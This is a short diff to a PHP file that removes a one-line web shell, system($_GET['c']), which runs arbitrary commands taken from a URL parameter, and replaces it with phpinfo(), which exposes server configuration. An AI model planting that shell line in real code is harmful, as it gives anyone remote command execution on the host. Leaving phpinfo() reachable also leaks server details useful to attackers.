@@ -1,5 +1,5 @@
 
 <?php 
-  system($_GET['c']);
+  phpinfo();
 ?>
 
